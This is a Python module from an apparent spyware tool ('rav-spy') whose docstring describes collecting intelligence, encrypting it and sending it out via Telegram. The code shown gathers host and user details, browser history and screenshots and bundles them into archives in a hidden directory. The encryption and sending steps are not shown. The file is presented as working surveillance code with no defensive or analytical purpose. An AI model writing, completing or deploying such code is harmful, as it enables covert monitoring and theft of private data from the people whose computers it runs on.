"""
Data Exfiltration — auto-collect intelligence, package, encrypt, send via Telegram.
"""
import os
import json
import asyncio
import tempfile
import tarfile
from pathlib import Path
from datetime import datetime
from loguru import logger

EXFIL_DIR = Path.home() / ".config" / "rav-spy" / "exfil"


def _collect_intel() -> dict:
    intel = {
        "timestamp": datetime.now().isoformat(),
        "hostname": os.uname().nodename,
        "system": {
            "os": os.uname().sysname,
            "release": os.uname().release,
            "uptime": "?",
        },
    }
    try:
        import psutil
        intel["system"]["uptime"] = int(psutil.boot_time())
        intel["system"]["cpu"] = psutil.cpu_percent(interval=0.5)
        intel["system"]["ram"] = psutil.virtual_memory().percent
        intel["system"]["disk"] = psutil.disk_usage("/").percent
        intel["users"] = [u.name for u in psutil.users()]
        intel["connections"] = len(psutil.net_connections())
    except Exception:
        pass

    return intel


async def collect(target: str = "auto") -> str | dict:
    if target == "auto":
        return _collect_intel()
    elif target == "history":
        try:
            from agent.browser_spy import history
            return {"type": "history", "data": await asyncio.to_thread(history, 50)}
        except Exception as e:
            return {"error": str(e)}
    elif target == "screenshots":
        try:
            from agent.screenshot import take_screenshot
            img = await asyncio.to_thread(take_screenshot)
            EXFIL_DIR.mkdir(parents=True, exist_ok=True)
            path = EXFIL_DIR / f"ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            path.write_bytes(img)
            return {"type": "screenshot", "path": str(path)}
        except Exception as e:
            return {"error": str(e)}
    else:
        return {"error": f"Unknown target: {target}"}


async def package(data: dict) -> str:
    EXFIL_DIR.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    json_path = EXFIL_DIR / f"intel_{ts}.json"
    json_path.write_text(json.dumps(data, indent=2, default=str))

    tar_path = EXFIL_DIR / f"intel_{ts}.tar.gz"
    with tarfile.open(tar_path, "w:gz") as tar:
        tar.add(json_path, arcname=json_path.name)

    json_path.unlink()
    return str(tar_path)
